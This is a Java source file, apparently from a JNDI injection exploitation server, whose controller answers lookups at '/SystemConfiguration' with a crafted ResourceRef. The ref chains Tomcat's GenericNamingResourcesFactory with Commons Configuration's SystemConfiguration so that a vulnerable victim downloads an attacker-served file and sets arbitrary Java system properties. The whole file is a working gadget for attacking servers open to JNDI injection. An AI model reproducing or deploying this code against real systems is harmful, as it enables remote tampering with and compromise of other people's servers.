package cn.butler.jndi.controller;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.server.WebServer;
import cn.butler.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/SystemConfiguration")
public class SystemConfigurationController implements Controller{
    public Object process(String data) {
        String randStr = MiscUtil.getRandStr(8);
        String fileName = randStr + ".txt";

        ResourceRef ref = new ResourceRef("org.apache.commons.configuration.SystemConfiguration", null, "", "",
            true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
        ref.add(new StringRefAddr("systemProperties", JndiConfig.codebase + fileName));

        WebServer.getInstance().serveFile("/" + fileName, data.getBytes());
        return ref;
    }

    @JNDIMapping("/{data}")
    public String setSystemConfiguration(String data) {
        System.out.println("[SystemConfiguration] Set Property: " + data);
        return data;
    }
}
